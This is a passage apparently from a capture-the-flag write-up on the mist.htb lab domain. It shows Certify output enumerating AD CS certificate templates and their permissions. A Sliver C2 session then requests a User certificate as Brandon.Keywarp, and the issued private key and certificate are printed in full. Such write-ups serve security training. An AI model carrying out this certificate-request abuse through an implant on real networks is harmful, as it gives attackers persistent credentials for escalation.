    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 75 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ComputerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ManagerAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Certificate Services     S-1-5-21-1045809509-3006658589-2426055941-1132
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : BackupSvcAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\CA Backup                S-1-5-21-1045809509-3006658589-2426055941-1134
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
```

- request certificate 
```
sliver (GRATEFUL_PERCH) > certify request '/ca:DC01\mist-DC01-CA' /template:User

[*] certify output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Request a Certificates

[*] Current user context    : MIST\Brandon.Keywarp
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb

[*] Certificate Authority   : DC01\mist-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 60

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5JLKfHU2L9WhOoOYvLk/WN6883I2NDwsgj4oiWhNmLDyse8Q
AwQd/X3mcfHJXh2SujXJFmRKcVxSa4b4DU8JUOupLgfm4dFWuLhK1kmpLM7OS605
P5ZlO+cWKiQw5BnX6ACsWxx8F6WoOeD8bB7oiYYZXnMzfJzn9eVf1E+n2G4sjig0
J2ch/VfpzqHGi7V8WvWC7wpbAgLXRXVkHj50kwJgQX2WZI26PTIKmM4k3FbZ+QOB
60T7gdhQDXCWjqkspEx7/XnVhzoWy6SCcHGqs8XZ6OJSXm3vxCF/zkajV87Re+Ec
rwHm5/29PTlzC0pp9Ti5MaEQZapHevScHoRAuQIDAQABAoIBAFqzfTJB+MymgyIL
ElLhV6fWSzh3e9bige7053UPNKuAm+3LpZjsy1HJ4eYZQgTcy1qk+TSve3LcZcBR
gKEXWeUIfsvLSu0U+sq2Jsw90qn7LpWNGYiID4fjvUHftp7tOmXPzpUhCoT/sW+2
PbRR14iq8+os4KN0R/+lk49WRI52+Z8YRE5hNCtGUi7fXOxf5XGsxyWIUAHaIod3
KBZRSe4zakoHrvIW13q7LVLaiYsLUyFydndluvKroA000vnMJRd0pnMiadoFAFUu
nVIaheUGADdc2znzbHwXnAXVZaH9QVaNrdnm2lyjqoX43OhwmcXD39nXZfAJQVIG
TZInOvkCgYEA65WkS7y33zXTYXmkHgrgtceEpMnn6Z1L1+eYgeacIsrTqQ7wnisx
2cjNUz9Cx+71OMCb0WkUhezZ6Ns+jNeCwp1P3mom13cn1UGlMwSJugxa3liNkfyf
uMzHR5vZKPiDzT7YE/oph7wMOH3sNwsbMenoIrHZxTwILzcVbUA4gy8CgYEA+GGc
Ehbg7Xy9HtpXLjSXkXZrP6fOvC+EYGRS0VmfDIF4cQQbhOU3KdDDDzdJ/ucSnvzu
q240S4ZmRMYPx4nqjfsoL3vO+eyQ3VOXN1ENrnfacU2KI4+h2piTGKmkjMlNiw/m
orBFTTOkHU+yoyvlaEuZTG/CkhpsKBnmtTGHIJcCgYEAwHZ3TBy4RxXtRDQhXR3b
6QZAGnSND7Ee9htR38YsBsyXUQVQlJeLWXYQMJN9FmPlWOEaK2Hij2spt2/uURf7
zszAJF+qrdq94x6HPP/XGPThA8dqmTq+rjY2FA2Bw1QMMZDG7MMyTJ7XiQtvAKUF
KakDqdyMofLiaNhim+ecg6cCgYEAxKrlHR2oc+L1DFzt8tQJv0/4k6qXc0JcmsZV
HRbNbOWHLFWIRK4KA74c9QteN8tXXzP+9xaHqdV9XK9HB0QYyNs5cn+h3xqFifoK
He672o1kFZrD6mxsR93PexO4CxHJqHaqs97GwN5G8D6Ov8yeFPrnIzLK6UyqnwYD
Oy1ARXkCgYBIs/edc1D1QsGjW44aMvNE24mpGHMonhMBPrg57hmyAupOghAB42iA
JZxnJglyYhlFo9O3dhrUMjcBCatFb2sZjhmvPnOGKzh8gdGwAxqGlvaI8RaUEjU0
YzSbZe75+fX04e9gEVRiwMH0kAZ4IH63Nkh+xvtmAlYMION63adsvA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITIwAAADynyFW94i1o1QAAAAAAPDANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI1MDQyMjE3NDE1MVoXDTI2MDQyMjE3
NDE1MVowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDkksp8dTYv1aE6g5i8uT9Y3rzz
cjY0PCyCPiiJaE2YsPKx7xADBB39feZx8cleHZK6NckWZEpxXFJrhvgNTwlQ66ku
B+bh0Va4uErWSakszs5LrTk/lmU75xYqJDDkGdfoAKxbHHwXpag54PxsHuiJhhle
czN8nOf15V/UT6fYbiyOKDQnZyH9V+nOocaLtXxa9YLvClsCAtdFdWQePnSTAmBB
fZZkjbo9MgqYziTcVtn5A4HrRPuB2FANcJaOqSykTHv9edWHOhbLpIJwcaqzxdno
4lJebe/EIX/ORqNXztF74RyvAebn/b09OXMLSmn1OLkxoRBlqkd69JwehEC5AgMB
AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFKFJx0lApZkTyAOY+RnZRg1R
lANZMB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
AQEAWt1+bEogjZrDctYVNrc5AiHd6wHTbVuPcbinsi8dvpoXHLuNLej5W6PwK9fw
P/J9BsgCigSx6tTFzBgEM/qSJMoVzxelcq+VClPCapxtiHRkEhxXsGs8ebpKfhaU
w7JsYny5CYCqBatWSrCjN+nnzMTNDNsYhX4kBa4UBYPGBzU4QeMPitmchtdiLPuo
85rFJeM9CpmQNUG9cI0+2femtpais26JTUYz406tz3bO7fFSzVs54sqpCqhChJuK
xDH9V/NHj5BCKrgpfYp6xdqOH6AgGht2VxsfTPwBUgFRhpmwseVIzoHyGY7lBDTQ
xP4FW1QbjxrkxaUWwwrKTQbGrA==
-----END CERTIFICATE-----


